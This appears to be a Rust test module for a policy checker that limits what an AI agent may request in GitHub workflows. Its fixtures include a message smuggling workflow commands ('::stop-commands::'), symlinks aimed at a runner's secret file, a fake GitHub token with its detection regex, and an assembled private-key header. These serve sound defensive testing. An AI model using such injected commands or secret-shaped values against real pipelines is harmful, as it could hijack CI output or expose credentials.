                (people, json!(["octocat", "hubot", "octocat"]), false),
                (people, json!(["mallory"]), false),
                (people, json!(["octocat", "mallory"]), false),
                (people, json!(["OctoCat"]), false),
                (people, json!(["@octocat"]), false),
                (people, json!([{"login": "octocat"}]), false),
                (people, json!([]), false),
                (people, json!("octocat"), false),
                (people, Value::Null, false),
                (number_key, json!(0), false),
                (number_key, json!("7"), false),
                (number_key, Value::Null, false),
                ("repo", json!("other/repo"), false),
                ("repo", Value::Null, false),
                ("target", json!("*"), false),
                ("item_number", json!(7), false),
                ("pr_number", json!(8), false),
                (alias, json!(["mallory"]), false),
            ] {
                let mut item = plain.clone();
                item[key] = value;
                assert_eq!(
                    redirections(item.as_object().unwrap(), &policy).is_empty(),
                    ok,
                    "{output} {key}: {item}"
                );
            }
            policy.safe_outputs.others.remove(output);
            assert!(!redirections(plain.as_object().unwrap(), &policy).is_empty());
        }
    }

    #[test]
    fn hidden_comments_stay_on_the_triggering_item_for_pinned_reasons() {
        let mut policy = policy();
        policy.safe_outputs.others.insert(
            HIDE_COMMENT.to_owned(),
            crate::policy::OutputLimit {
                max: 1,
                allowed_reasons: vec!["SPAM".to_owned(), "OUTDATED".to_owned()],
                ..Default::default()
            },
        );
        let item = Some(("tracker/items", 64));
        for (fields, comment, ok) in [
            (json!({}), item, true),
            (json!({"reason": "OUTDATED"}), item, true),
            (
                json!({"repo": "TRACKER/ITEMS", "reason": "SPAM"}),
                item,
                true,
            ),
            (json!({"reason": "ABUSE"}), item, false),
            (json!({"reason": "outdated"}), item, false),
            (json!({"reason": null}), item, false),
            (json!({"reason": ["SPAM"]}), item, false),
            (json!({"repo": "bootc-dev/bootc"}), item, false),
            (json!({"repo": "other/repo"}), item, false),
            // No triggering item to hold the handler to.
            (json!({}), None, false),
        ] {
            let mut request = fields.as_object().unwrap().clone();
            request.insert("type".into(), json!(HIDE_COMMENT));
            request.insert("comment_id".into(), json!("IC_kwDOABCD123456"));
            assert_eq!(
                redirections_to(&request, &policy, comment).is_empty(),
                ok,
                "{fields} {comment:?}"
            );
        }
    }

    #[test]
    fn review_threads_stay_on_the_triggering_pull_request() {
        let mut policy = policy();
        for output in REVIEW_THREAD_OUTPUTS {
            policy.safe_outputs.others.insert(
                (*output).to_owned(),
                crate::policy::OutputLimit {
                    max: 1,
                    ..Default::default()
                },
            );
        }
        let item = Some(("tracker/items", 64));
        for (output, fields, comment, ok) in [
            (
                "create_pull_request_review_comment",
                json!({"path": "src/lib.rs", "line": 3, "body": "b"}),
                item,
                true,
            ),
            (
                "create_pull_request_review_comment",
                json!({"path": "a", "line": 3, "body": "b", "pull_request_number": 64, "repo": "Tracker/Items"}),
                item,
                true,
            ),
            // A review's inline finding (review.yml): a range, either side.
            (
                "create_pull_request_review_comment",
                json!({"path": "a", "line": 3, "start_line": 1, "side": "LEFT", "body": "b", "pull_request_number": 64}),
                item,
                true,
            ),
            (
                "create_pull_request_review_comment",
                json!({"path": "a", "line": 3, "body": "b", "pull_request_number": 65}),
                item,
                false,
            ),
            (
                "create_pull_request_review_comment",
                json!({"path": "a", "line": 3, "start_line": 1, "body": "b", "pull_request_number": "65"}),
                item,
                false,
            ),
            (
                "create_pull_request_review_comment",
                json!({"path": "a", "line": 3, "body": "b", "repo": "bootc-dev/bootc"}),
                item,
                false,
            ),
            (
                "reply_to_pull_request_review_comment",
                json!({"comment_id": 1001, "body": "b"}),
                item,
                true,
            ),
            (
                "reply_to_pull_request_review_comment",
                json!({"comment_id": 1001, "body": "b", "pull_request_number": 64}),
                item,
                true,
            ),
            (
                "reply_to_pull_request_review_comment",
                json!({"comment_id": 1001, "body": "b", "pull_request_number": 63}),
                item,
                false,
            ),
            (
                "reply_to_pull_request_review_comment",
                json!({"comment_id": 1001, "body": "b", "repo": "other/repo"}),
                item,
                false,
            ),
            (
                "resolve_pull_request_review_thread",
                json!({"thread_id": "PRRT_kwDOABCD123456"}),
                item,
                true,
            ),
            // No triggering pull request to hold the handlers to.
            (
                "create_pull_request_review_comment",
                json!({"path": "a", "line": 3, "body": "b", "pull_request_number": 64}),
                None,
                false,
            ),
            (
                "reply_to_pull_request_review_comment",
                json!({"comment_id": 1001, "body": "b"}),
                None,
                false,
            ),
            (
                "resolve_pull_request_review_thread",
                json!({"thread_id": "PRRT_kwDOABCD123456"}),
                None,
                false,
            ),
        ] {
            let mut request = fields.as_object().unwrap().clone();
            request.insert("type".into(), json!(output));
            assert_eq!(
                redirections_to(&request, &policy, comment).is_empty(),
                ok,
                "{output} {fields} {comment:?}"
            );
        }
    }

    #[test]
    fn discussions_keep_the_pinned_category_and_repo() {
        let mut policy = policy();
        policy.safe_outputs.others.insert(
            "create_discussion".to_owned(),
            crate::policy::OutputLimit {
                max: 1,
                category: Some("Agent reports".to_owned()),
                ..Default::default()
            },
        );
        let plain = json!({"type": "create_discussion", "title": "t", "body": "b"});
        for (key, value, ok) in [
            ("category", json!("Agent reports"), true),
            ("category", json!("agent reports"), false),
            ("category", json!("Announcements"), false),
            ("category", json!(""), false),
            ("category", json!(["Agent reports"]), false),
            ("category", Value::Null, false),
            ("repo", json!(policy.repo.to_uppercase()), true),
            ("repo", json!("other/repo"), false),
        ] {
            let mut item = plain.clone();
            item[key] = value;
            assert_eq!(
                redirections(item.as_object().unwrap(), &policy).is_empty(),
                ok,
                "{key}: {item}"
            );
        }
        assert!(redirections(plain.as_object().unwrap(), &policy).is_empty());
        let dir = tempfile::tempdir().unwrap();
        let out = dir.path().join("out");
        std::fs::create_dir(&out).unwrap();
        std::fs::write(out.join(OUTPUTS_FILE), format!("{plain}\n")).unwrap();
        let collected = dir.path().join("collected.json");
        for count in [1, 2] {
            std::fs::write(
                &collected,
                json!({"items": vec![plain.clone(); count], "errors": []}).to_string(),
            )
            .unwrap();
            assert_eq!(
                check_outputs(&out, &collected, &policy).unwrap().ok,
                count == 1,
                "{count}"
            );
        }
    }

    #[test]
    fn check_runs_keep_the_pinned_name_and_no_success() {
        let mut policy = policy();
        policy.safe_outputs.others.insert(
            "create_check_run".to_owned(),
            crate::policy::OutputLimit {
                max: 1,
                name: Some("agent verdict".to_owned()),
                ..Default::default()
            },
        );
        let plain = json!({"type": "create_check_run", "conclusion": "neutral",
            "title": "t", "summary": "s", "pull_request_number": 7});
        for (key, value, ok) in [
            ("conclusion", json!("neutral"), true),
            ("conclusion", json!("failure"), true),
            ("conclusion", json!("success"), false),
            ("pull_request_number", json!(0), false),
            ("pull_request_number", json!("7"), false),
            ("pull_request_number", Value::Null, false),
            ("pr_number", json!(8), false),
            ("target", json!("*"), false),
            ("repo", json!("other/repo"), false),
        ] {
            let mut item = plain.clone();
            item[key] = value;
            assert_eq!(
                redirections(item.as_object().unwrap(), &policy).is_empty(),
                ok,
                "{key}: {item}"
            );
        }
        let mut item = plain.clone();
        item.as_object_mut().unwrap().remove("pull_request_number");
        assert!(!redirections(item.as_object().unwrap(), &policy).is_empty());
        let dir = tempfile::tempdir().unwrap();
        let out = dir.path().join("out");
        std::fs::create_dir(&out).unwrap();
        std::fs::write(out.join(OUTPUTS_FILE), format!("{plain}\n")).unwrap();
        let collected = dir.path().join("collected.json");
        for count in [1, 2] {
            std::fs::write(
                &collected,
                json!({"items": vec![plain.clone(); count], "errors": []}).to_string(),
            )
            .unwrap();
            assert_eq!(
                check_outputs(&out, &collected, &policy).unwrap().ok,
                count == 1,
                "{count}"
            );
        }
        // The collector drops `name`, so it is looked for in the agent's lines.
        std::fs::write(
            &collected,
            json!({"items": [plain], "errors": []}).to_string(),
        )
        .unwrap();
        for (name, ok) in [
            (json!("agent verdict"), true),
            (json!("Agent Verdict"), false),
            (json!("required-ci"), false),
            (json!(["agent verdict"]), false),
            (Value::Null, false),
        ] {
            for kind in ["create_check_run", "create-check-run"] {
                let mut item = plain.clone();
                item["type"] = json!(kind);
                item["name"] = name.clone();
                std::fs::write(out.join(OUTPUTS_FILE), format!("{item}\n")).unwrap();
                assert_eq!(
                    check_outputs(&out, &collected, &policy).unwrap().ok,
                    ok,
                    "{item}"
                );
            }
        }
    }

    #[test]
    fn issue_action_payloads_are_not_silently_changed() {
        for output in ["add_labels", "remove_labels"] {
            for (labels, max, ok) in [
                (vec!["triage", "docs"], 2, true),
                (vec!["triage", "docs"], 1, false),
                (vec!["release&"], 1, false),
                (vec!["release\u{200b}"], 1, false),
                (vec!["ｒｅｌｅａｓｅ"], 1, false),
                (vec!["@release"], 1, false),
                (vec!["-release"], 1, false),
                (vec![""], 1, false),
                (vec!["triage "], 1, false),
                (vec!["area/docs: needs_triage"], 1, true),
            ] {
                let mut policy = policy();
                policy.safe_outputs.others.insert(
                    output.to_owned(),
                    crate::policy::OutputLimit {
                        max,
                        allowed: Some(labels.iter().map(|label| (*label).to_owned()).collect()),
                        blocked: vec!["release".to_owned()],
                        ..crate::policy::OutputLimit::default()
                    },
                );
                let item = json!({"type": output, "repo": policy.repo, "item_number": 7, "labels": labels});
                assert_eq!(
                    redirections(item.as_object().unwrap(), &policy).is_empty(),
                    ok,
                    "{item}"
                );
            }
        }
        let policy = policy();
        for (body, ok) in [
            (Some(json!("Done in #8.")), true),
            (Some(json!("")), false),
            (Some(json!(" \n")), false),
            (Some(Value::Null), false),
            (Some(json!(["Done"])), false),
            (None, false),
        ] {
            let mut item = json!({"type": "close_issue", "repo": policy.repo, "issue_number": 7});
            if let Some(body) = body {
                item["body"] = body;
            }
            assert_eq!(
                redirections(item.as_object().unwrap(), &policy).is_empty(),
                ok,
                "{item}"
            );
        }
        for (reason, ok) in [
            (Some(json!("completed")), true),
            (Some(json!("not_planned")), true),
            (None, true),
            (Some(json!("duplicate")), false),
            (Some(json!("COMPLETED")), false),
            (Some(json!("")), false),
            (Some(Value::Null), false),
        ] {
            let mut item = json!({"type": "close_issue", "repo": policy.repo, "issue_number": 7, "body": "Done."});
            if let Some(reason) = reason {
                item["state_reason"] = reason;
            }
            assert_eq!(
                redirections(item.as_object().unwrap(), &policy).is_empty(),
                ok,
                "{item}"
            );
        }
    }

    #[test]
    fn issue_labels_are_checked_not_silently_filtered() {
        let mut policy = policy();
        policy.safe_outputs.others.insert(
            CREATE_ISSUE.to_owned(),
            crate::policy::OutputLimit {
                max: 1,
                allowed: Some(vec!["triage".to_owned(), "blocked".to_owned()]),
                blocked: vec!["blocked".to_owned()],
                ..crate::policy::OutputLimit::default()
            },
        );
        for (labels, ok) in [
            (json!([]), true),
            (json!(["TRIAGE"]), true),
            (json!(["triage", "other"]), false),
            (json!(["BLOCKED"]), false),
            (json!(["blocked "]), false),
            (json!([7]), false),
            (json!("triage"), false),
            (Value::Null, false),
        ] {
            let item = json!({"type": CREATE_ISSUE, "labels": labels});
            assert_eq!(
                redirections(item.as_object().unwrap(), &policy).is_empty(),
                ok,
                "{labels}"
            );
        }
        let limit = policy.safe_outputs.others.get_mut(CREATE_ISSUE).unwrap();
        limit.allowed = Some(Vec::new());
        let item = json!({"type": CREATE_ISSUE, "labels": ["triage"]});
        assert!(!redirections(item.as_object().unwrap(), &policy).is_empty());
        policy
            .safe_outputs
            .others
            .get_mut(CREATE_ISSUE)
            .unwrap()
            .allowed = None;
        assert!(redirections(item.as_object().unwrap(), &policy).is_empty());
    }

    #[test]
    fn what_is_refused() {
        // Put together, so that this file holds no private key.
        let key = format!("-----BEGIN {}-----", "PRIVATE KEY");
        let pr = Handback::pull_request;
        let comment = json!({"type": "add_comment", "body": "x", "item_number": 1});
        let other_base = |repo: &str, branch: &str, commit: &str| {
            Some(json!({"repo": repo, "ref": branch, "commit": commit}).to_string())
        };
        let cases = [
            (
                "what the collector refused",
                Handback {
                    refused: vec!["Line 1: Unexpected output type 'add_comment'"],
                    ..Handback::default()
                },
                "Unexpected output type",
            ),
            (
                "a type the policy does not have",
                Handback {
                    items: vec![comment],
                    ..Handback::default()
                },
                "\"add_comment\", which the policy does not allow",
            ),
            (
                "more of a type than its maximum",
                Handback {
                    items: vec![pull_request(), pull_request()],
                    ..pr()
                },
                "2 outputs of type \"create_pull_request\", over 1",
            ),
            (
                "more outputs than max_outputs",
                Handback {
                    items: vec![noop(), noop(), noop(), noop()],
                    ..Handback::default()
                },
                "4 outputs, over max_outputs 3",
            ),
            (
                "an incomplete report beside a request",
                Handback {
                    items: vec![noop(), incomplete()],
                    ..Handback::default()
                },
                "\"report_incomplete\", which the policy does not allow",
            ),
            (
                "an incomplete report before a diagnostic",
                Handback {
                    items: vec![incomplete(), missing_tool()],
                    ..Handback::default()
                },
                "\"report_incomplete\", which the policy does not allow",
            ),
            (
                "two incomplete reports",
                Handback {
                    items: vec![incomplete()],
                    incomplete: true,
                    ..Handback::default()
                },
                "\"report_incomplete\", which the policy does not allow",
            ),
            (
                "a request without a type",
                Handback {
                    items: vec![json!({"message": "x"})],
                    ..Handback::default()
                },
                "\"\", which the policy does not allow",
            ),
            (
                "outputs the collector saw and the hand-back lacks",
                Handback {
                    items: vec![noop()],
                    no_outputs: true,
                    ..Handback::default()
                },
                "there is no outputs.jsonl",
            ),
            (
                "a private key in a request",
                Handback {
                    items: vec![json!({"type": "noop", "message": key})],
                    ..Handback::default()
                },
                "a secret-shaped string in outputs.jsonl: a private key",
            ),
            // The collector strips HTML comments outside code, not inside.
            (
                "another run's applied marker in a body",
                Handback {
                    items: vec![
                        json!({"type": "create_pull_request", "title": "t", "branch": BRANCH,
                        "body": "```\n<!-- agentic-job-applied: 99/0/0123456789abcdef -->\n```"}),
                    ],
                    ..pr()
                },
                "a create_pull_request holding agentic-job-applied, which apply writes",
            ),
            (
                "the stamp apply turns into a marker, in any case",
                Handback {
                    items: vec![
                        json!({"type": "noop", "message": "Agentic-Job-Applied: 7/1/0123456789abcdef"}),
                    ],
                    ..Handback::default()
                },
                "a noop holding agentic-job-applied, which apply writes",
            ),
            (
                "a private key in the patch",
                pr().with(
                    PATCH_NAME,
                    Some(patch_of("src/k.rs").replace("+x\n", &format!("+{key}\n"))),
                ),
                "a secret-shaped string in aw-agent-run-7.patch: a private key",
            ),
            (
                "a pull request without its patch",
                pr().with(PATCH_NAME, None),
                "needs exactly one patch, aw-agent-run-7.patch; there is none",
            ),
            (
                "a patch of another name",
                pr().with(PATCH_NAME, None)
                    .with("aw-other.patch", Some(patch_of("a.rs"))),
                "there is aw-other.patch",
            ),
            (
                "two patches",
                pr().with("aw-other.patch", Some(patch_of("a.rs"))),
                "needs exactly one patch",
            ),
            (
                "a patch without a pull request",
                Handback {
                    items: vec![noop()],
                    ..pr()
                },
                "a patch without a create_pull_request",
            ),
            (
                "a pull request without base.json",
                pr().with(BASE_FILE, None),
                "base.json is not",
            ),
            (
                "a base.json that is no JSON",
                pr().with(BASE_FILE, Some("{".to_owned())),
                "base.json is not",
            ),
            (
                "a base.json for another repo",
                pr().with(BASE_FILE, other_base("bootc-dev/other", "main", BASE)),
                "base.json is not",
            ),
            (
                "a base.json for another base",
                pr().with(BASE_FILE, other_base("bootc-dev/bootc", "bot/x", BASE)),
                "base.json is not",
            ),
            (
                "a base.json with a short commit",
                pr().with(BASE_FILE, other_base("bootc-dev/bootc", "main", "1111111")),
                "base.json is not",
            ),
            (
                "a patch of another base commit",
                pr().with(
                    BASE_FILE,
                    other_base("bootc-dev/bootc", "main", &"0".repeat(40)),
                ),
                "is not the base commit",
            ),
            (
                "a stray file",
                pr().with("notes.txt", Some("hi".to_owned())),
                "unexpected file \"notes.txt\"",
            ),
            (
                "a collector's result among the files",
                pr().with("agent_output.json", Some("{}".to_owned())),
                "unexpected file \"agent_output.json\"",
            ),
            (
                "a base.json too big",
                pr().with(BASE_FILE, Some(" ".repeat(5000))),
                "base.json is 5000 bytes, over 4096",
            ),
            (
                "a protected file",
                pr().with(PATCH_NAME, Some(patch_of("CONTRIBUTING.md"))),
                "aw-agent-run-7.patch: protected files: CONTRIBUTING.md",
            ),
            (
                "a pull request for another repository",
                Handback {
                    items: vec![
                        json!({"type": "create_pull_request", "title": "t", "body": "b", "branch": BRANCH, "repo": "evil/other"}),
                    ],
                    ..pr()
                },
                "with repo \"evil/other\", which is not the policy's",
            ),
            (
                "a comment in another repository",
                Handback {
                    items: vec![json!({"type": "noop", "message": "m", "repo": ["x"]})],
                    ..Handback::default()
                },
                "a noop with repo [\"x\"]",
            ),
            (
                "a pull request onto another base",
                Handback {
                    items: vec![
                        json!({"type": "create_pull_request", "title": "t", "body": "b", "branch": BRANCH, "base": "release"}),
                    ],
                    ..pr()
                },
                "with base \"release\", which is not the policy's",
            ),
            (
                "a pull request that is not a draft",
                Handback {
                    items: vec![
                        json!({"type": "create_pull_request", "title": "t", "body": "b", "branch": BRANCH, "draft": false}),
                    ],
                    ..pr()
                },
                "a create_pull_request that is not a draft",
            ),
            (
                "a pull request without a branch",
                Handback {
                    items: vec![json!({"type": "create_pull_request", "title": "t", "body": "b"})],
                    ..pr()
                },
                "needs exactly one patch, aw-.patch",
            ),
        ];
        for (name, handback, want) in cases {
            let verdict = handback.check();
            assert!(!verdict.ok, "{name}");
            assert!(
                verdict.errors.iter().any(|e| e.contains(want)),
                "{name}: {:#?}",
                verdict.errors
            );
        }
    }

    /// A string only shaped like a credential, a test fixture's fake key,
    /// is accepted and named by place, never shown.
    #[test]
    fn a_fixture_shaped_like_a_key_is_a_warning() {
        let token = format!("gh{}_{}", "p", "a1B2".repeat(10));
        let patch = patch_of("src/k.rs").replace("+x\n", &format!("+{token}\n"));
        let line = 1 + patch[..patch.find(&token).unwrap()].matches('\n').count();
        let verdict = Handback::pull_request()
            .with(PATCH_NAME, Some(patch))
            .check();
        assert!(verdict.ok, "{:?}", verdict.errors);
        assert_eq!(
            verdict.warnings,
            [format!(
                "{PATCH_NAME}, line {line}: matches `gh[posur]_[A-Za-z0-9_]{{20,}}`"
            )]
        );
        let shown = format!(
            "{}{}",
            verdict.markdown(&policy()),
            serde_json::to_string(&verdict).unwrap()
        );
        assert!(shown.contains("- warning: a secret-shaped string in aw-agent-run-7.patch"));
        assert!(!shown.contains(&token));
    }

    #[test]
    fn a_request_may_repeat_what_the_policy_says() {
        let base = json!({"repo": "Bootc-Dev/BOOTC", "ref": "main", "commit": BASE}).to_string();
        assert!(
            Handback::pull_request()
                .with(BASE_FILE, Some(base))
                .check()
                .ok
        );
        let request = json!({
            "type": "create_pull_request", "title": "t", "body": "b", "branch": BRANCH,
            "repo": "Bootc-Dev/bootc", "base": "main", "draft": true,
        });
        let verdict = Handback {
            items: vec![request],
            ..Handback::pull_request()
        }
        .check();
        assert_eq!(verdict.errors, Vec::<String>::new());
    }

    #[test]
    fn links_and_directories_are_not_read() {
        let dir = tempfile::tempdir().unwrap();
        let out = dir.path().join("out");
        std::fs::create_dir(&out).unwrap();
        let secret = dir.path().join("secret");
        std::fs::write(
            &secret,
            "{\"type\":\"noop\",\"message\":\"the runner's file\"}\n",
        )
        .unwrap();
        symlink(&secret, out.join(OUTPUTS_FILE)).unwrap();
        symlink(&secret, out.join(memory::MEMORY_FILE)).unwrap();
        std::fs::create_dir(out.join(BASE_FILE)).unwrap();
        let collected = dir.path().join("agent_output.json");
        std::fs::write(&collected, r#"{"items":[],"errors":[]}"#).unwrap();

        let mut with_memory = policy();
        with_memory.memory = Some(memory_rules());
        let verdict = check_outputs(&out, &collected, &with_memory).unwrap();
        assert_eq!(
            verdict.errors,
            [
                "base.json is not a regular file",
                "memory.json is not a regular file",
                "outputs.jsonl is not a regular file"
            ]
        );
        // The collector's result is the check's own input: a bad one is
        // an error and no verdict.
        let empty = dir.path().join("empty");
        std::fs::create_dir(&empty).unwrap();
        for bad in ["not json", r#"{"items":[]}"#] {
            std::fs::write(&collected, bad).unwrap();
            assert!(
                check_outputs(&empty, &collected, &policy()).is_err(),
                "{bad}"
            );
        }
        assert!(check_outputs(&out, &dir.path().join("missing"), &policy()).is_err());
    }

    fn memory_rules() -> crate::policy::Memory {
        toml::from_str("").unwrap()
    }

    /// `memory.json` is held to the policy's `[memory]`, beside a patch or
    /// a replacement, and refused without one; a report counts it.
    #[test]
    fn memory_is_checked_where_the_policy_allows_it() {
        let notes = json!({"files": {"notes.md": "Ran the tests.\n"}}).to_string();
        let token = "gh".to_owned() + "p_" + &"a1B2".repeat(10);
        let secret = json!({"files": {"notes.md": token}}).to_string();
        let script = json!({"files": {"run.sh": "x"}}).to_string();
        let without = policy();
        let mut with_memory = policy();
        with_memory.memory = Some(memory_rules());
        let mut push = crate::policy::tests::push_policy();
        let config = push
            .safe_outputs
            .push_to_pull_request_branch
            .as_mut()
            .unwrap();
        config.replacement_max_commits = 1;
        config.replacement_base = Some(BASE.into());
        push.memory = Some(memory_rules());
        let mail = patch_of("src/a.rs").replace(&format!("{BASE_COMMIT_HEADER}: {BASE}\n"), "");
        let replacing = |memory: &str| Handback {
            items: vec![
                json!({"type": PUSH_TO_PULL_REQUEST_BRANCH, "message": "Fix\n\nWhy.", "branch": "agent-run-12"}),
            ],
            files: vec![
                (
                    replacement::REPLACEMENT_FILE,
                    json!({"base_commit": BASE, "commits": [mail]}).to_string(),
                ),
                (memory::MEMORY_FILE, memory.to_owned()),
            ],
            ..Handback::default()
        };
        let only =
            |memory: &str| Handback::default().with(memory::MEMORY_FILE, Some(memory.to_owned()));
        // (the case, the hand-back, the policy, what refuses it)
        let cases: Vec<(&str, Handback, &Policy, Option<&str>)> = vec![
            ("memory alone", only(&notes), &with_memory, None),
            (
                "memory and a patch",
                Handback::pull_request().with(memory::MEMORY_FILE, Some(notes.clone())),
                &with_memory,
                None,
            ),
            ("memory and a replacement", replacing(&notes), &push, None),
            (
                "no [memory]",
                only(&notes),
                &without,
                Some("memory.json without a [memory] bound"),
            ),
            (
                "a script",
                only(&script),
                &with_memory,
                Some("memory: memory file \"run.sh\" has none of the extensions"),
            ),
            (
                "a script beside a replacement",
                replacing(&script),
                &push,
                Some("memory: memory file \"run.sh\""),
            ),
            (
                "a secret",
                only(&secret),
                &with_memory,
                Some("memory: a memory file holds a secret-shaped string"),
            ),
            (
                "too big to read",
                only(&format!(
                    "{{\"files\": {{\"a.md\": \"{}\"}}}}",
                    " ".repeat(5000)
                )),
                &without,
                Some("memory.json is 50"),
            ),
        ];
        for (name, handback, policy, want) in cases {
            let verdict = handback.check_against(policy);
            match want {
                None => {
                    assert_eq!(verdict.errors, Vec::<String>::new(), "{name}");
                    assert_eq!(
                        verdict.memory,
                        Some(memory::MemoryInfo {
                            files: 1,
                            bytes: 15
                        }),
                        "{name}"
                    );
                    let report = serde_json::to_value(&verdict).unwrap();
                    assert_eq!(report["memory"], json!({"files": 1, "bytes": 15}), "{name}");
                    assert!(
                        verdict
                            .markdown(policy)
                            .contains("- memory: 1 file(s), 15 bytes\n"),
                        "{name}"
                    );
                }
                Some(want) => {
                    assert!(
                        verdict.errors.iter().any(|error| error.contains(want)),
                        "{name}: {:?}",
                        verdict.errors
                    );
                    assert_eq!(verdict.memory, None, "{name}");
                }
            }
        }
        let report = serde_json::to_value(Handback::pull_request().check()).unwrap();
        assert!(report.get("memory").is_none());
    }

    #[test]
    fn patch_file_names() {
        let cases = [
            ("agent-run-7", "aw-agent-run-7.patch"),
            ("Feature/Fix: it", "aw-feature-fix- it.patch"),
            ("a//b", "aw-a-b.patch"),
            ("/a/", "aw-a.patch"),
            ("a--b", "aw-a-b.patch"),
            ("", "aw-.patch"),
        ];
        for (branch, want) in cases {
            assert_eq!(patch_file_name(branch), want, "{branch}");
        }
    }

    #[test]
    fn the_summary_holds_no_line_of_the_agents_own() {
        let hostile =
            json!({"type": "noop", "message": "done\n::error::owned\r\n::stop-commands::x"});
        let verdict = Handback {
            items: vec![hostile],
            ..Handback::default()
        }
        .check();
        let markdown = verdict.markdown(&policy());
        assert!(
            markdown.starts_with("### Safe outputs: accepted\n"),
            "{markdown}"
        );
        assert!(
            markdown.contains("- `noop`: done ::error::owned  ::stop-commands::x\n"),
            "{markdown}"
        );
        assert!(
            markdown.lines().all(|line| !line.starts_with("::")),
            "{markdown}"
        );

        let refused = Handback::pull_request().with(PATCH_NAME, None).check();
        let markdown = refused.markdown(&policy());
        assert!(
            markdown.starts_with("### Safe outputs: refused\n"),
            "{markdown}"
        );
        assert!(
            markdown.contains("- refused: create_pull_request needs exactly one patch"),
            "{markdown}"
        );
    }

    #[test]
    fn bounded_close_and_link_actions() {
        for (output, number_keys) in [
            ("close_issue", &["issue_number"][..]),
            ("add_labels", &["item_number"]),
            ("remove_labels", &["item_number"]),
            ("close_pull_request", &["pull_request_number"]),
            (
                "link_sub_issue",
                &["parent_issue_number", "sub_issue_number"],
            ),
        ] {
            let labels = output.ends_with("_labels");
            let mut policy = policy();
            policy.safe_outputs.others.insert(
                output.to_owned(),
                crate::policy::OutputLimit {
                    max: 1,
                    allowed: labels.then(|| vec!["triage".to_owned()]),
                    ..Default::default()
                },
            );
            let mut plain = json!({"type": output, "repo": policy.repo});
            if labels {
                plain["labels"] = json!(["triage"]);
            }
            if matches!(output, "close_issue" | "close_pull_request") {
                // Posted on the item as it is closed.
                plain["body"] = json!("Superseded.");
            }
            for (n, key) in number_keys.iter().enumerate() {
                plain[*key] = json!(7 + n);
            }
            let mut cases = vec![
                ("repo", json!(policy.repo.to_uppercase()), true),
                ("repo", json!("other/repo"), false),
                ("repo", Value::Null, false),
                ("target", json!("*"), false),
                ("duplicate_of", json!("other/repo#8"), false),
            ];
            for key in number_keys {
                cases.extend([
                    (*key, json!(9), true),
                    (*key, json!(0), false),
                    (*key, json!("9"), false),
                    (*key, json!("aw_parent1"), false),
                    (*key, Value::Null, false),
                ]);
            }
            for alias in [
                "item_number",
                "issue_number",
                "pr_number",
                "pull_request_number",
            ] {
                if !number_keys.contains(&alias) {
                    cases.push((alias, json!(8), false));
                }
            }
            for (key, value, ok) in cases {
                let mut item = plain.clone();
                item[key] = value;
                assert_eq!(
                    redirections(item.as_object().unwrap(), &policy).is_empty(),
                    ok,
                    "{output} {key}: {item}"
                );
            }
            let mut item = plain.clone();
            item.as_object_mut().unwrap().remove("repo");
            assert!(!redirections(item.as_object().unwrap(), &policy).is_empty());
            if labels {
                for labels in [json!(["release"]), json!([{"name": "triage"}])] {
                    let mut item = plain.clone();
                    item["labels"] = labels;
                    assert!(!redirections(item.as_object().unwrap(), &policy).is_empty());
                }
            }
            if output == "remove_labels" {
                for labels in [
                    None,
                    Some(Value::Null),
                    Some(json!("triage")),
                    Some(json!([])),
                ] {
                    let mut item = plain.clone();
                    item.as_object_mut().unwrap().remove("labels");
                    if let Some(labels) = labels {
                        item["labels"] = labels;
                    }
                    assert!(!redirections(item.as_object().unwrap(), &policy).is_empty());
                }
                let limit = policy.safe_outputs.others.get_mut(output).unwrap();
                limit.allowed = Some(vec![]);
                assert!(!redirections(plain.as_object().unwrap(), &policy).is_empty());
                policy.safe_outputs.others.get_mut(output).unwrap().allowed =
                    Some(vec!["triage".to_owned()]);
            }
            let dir = tempfile::tempdir().unwrap();
            let out = dir.path().join("out");
            std::fs::create_dir(&out).unwrap();
            std::fs::write(out.join(OUTPUTS_FILE), format!("{plain}\n")).unwrap();
            let collected = dir.path().join("collected.json");
            for count in [1, 2] {
                std::fs::write(
                    &collected,
                    json!({"items": vec![plain.clone(); count], "errors": []}).to_string(),
                )
                .unwrap();
                assert_eq!(
                    check_outputs(&out, &collected, &policy).unwrap().ok,
                    count == 1,
                    "{output}: {count}"
                );
            }
        }
    }
}
